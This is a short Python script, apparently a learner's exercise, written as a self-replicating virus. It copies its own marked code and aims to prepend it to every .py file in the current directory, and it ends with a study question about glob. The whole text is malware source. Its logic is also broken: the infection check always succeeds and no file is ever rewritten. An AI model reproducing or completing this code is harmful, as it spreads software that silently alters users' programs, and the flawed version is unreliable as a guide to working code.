#### VIRUS BEGIN ####

import sys, glob, re

# 1. get a copy of the virus
# 2. find potential victims (other programs)
# 3. check and infect 
# 4. optional payload (execute virus program)


#### GET A COPY OF THE VIRUS ####
vCode = []                               # virus list
fh = open(sys.argv[0], "r")              # open copy of self, read only
lines = fh.readlines()                   # read all lines of the virus file, save to lines
fh.close()                               # close the file

inVirus = False                          # default: not in the virus

for line in lines:                                   # iterate through lines from file
    if (re.search('^#### VIRUS BEGIN ####', line)):  # check for the first line of the file
        inVirus = True                               # if so, we are in the virus

    if (inVirus):                                    # while in the virus file
        vCode.append(line)                           # add the line to the vCode list
    
    if (re.search('^#### VIRUS END ####', line)):    # check for the last line of the file
        break                                        # stop copying because end of virus code


#### FIND POTENTIAL VICTIMS (PROGRAMS) ####
progs = glob.glob("*.py")                            # search for all programs with a *.py extension (python files)


#### CHECK AND INFECT ####                           # look through potential victims, figure out if they need to be infected
for prog in progs:                                   # iterate through programs selected previously
    fh = open(prog, "r")                             # open the program file as read only
    pCode = fh.readlines()                           # read lines in file, save to pCode variable
    fh.close()                                       # close the file

    infected = False                                 # default assumption is that program is NOT infected

    for line in pCode:                               # iterate through lines from program file
        if ('#### VIRUS BEGIN ####'):                # check if the first line of the virus is present
            infected = True                          # if so, mark infected as True
            break                                    # break out of this for loop; continue first for loop

    if not infected:                                 # if infected is False, you want to infect the system
        newCode = []                                 # newCode is a collection of original program code plus virus code
        if ('#!' in pCode[0]):                       # check for the first line of the virus -- starts with #
            newCode. append(pCode.pop(0))            # add that first line to newCode
        newCode.extend(vCode)                        # load all virus code into newCode
        newCode.extend(pCode)                        # load all original program code into newCode




print("Infected")

#### VIRUS END ####




### QUESTIONS:
    # what is glob?